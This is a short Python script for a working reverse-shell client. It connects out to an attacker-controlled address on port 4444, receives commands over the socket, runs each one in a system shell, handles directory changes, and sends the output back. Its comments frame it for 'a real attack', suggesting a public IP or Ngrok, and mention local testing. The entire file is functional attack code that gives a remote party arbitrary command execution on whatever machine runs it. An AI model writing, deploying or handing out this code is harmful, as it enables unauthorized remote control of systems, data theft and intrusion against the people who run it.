import socket
import os
import subprocess

# --- CONFIGURATION ---
# In a real attack, this is your Public IP (or Ngrok).
# For testing, use localhost or your local LAN IP (e.g., 192.168.1.X)
ATTACKER_IP = "192.168.56.1" 
PORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print(f"[*] Trying to connect to {ATTACKER_IP}:{PORT}...") # DEBUG
    
    try:
        s.connect((ATTACKER_IP, PORT))
        print("[+] Connected to Server!") # DEBUG
    except Exception as e:
        print(f"[-] Connection Failed: {e}") # THIS WILL TELL YOU THE PROBLEM
        return

    while True:
        # 1. Receive Command
        try:
            command = s.recv(1024).decode()
            
            if command.lower() == 'exit':
                break
            
            # 2. Handle 'cd' (Directory Navigation)
            if command.startswith('cd '):
                try:
                    # Extract path "cd /users/..."
                    target_dir = command[3:].strip()
                    os.chdir(target_dir) # Actually change directory
                    s.send(f"[+] Changed to: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(str(e).encode())
                    
            # 3. Handle General Commands
            else:
                # Execute command in shell
                proc = subprocess.Popen(command, shell=True, 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, 
                                      stdin=subprocess.PIPE)
                
                # Read output
                output = proc.stdout.read() + proc.stderr.read()
                
                # Send back to attacker (if empty, send confirmation)
                if not output:
                    output = b"[+] Command Executed (No Output)"
                    
                s.send(output)
                
        except Exception as e:
            break

    s.close()

if __name__ == "__main__":
    connect()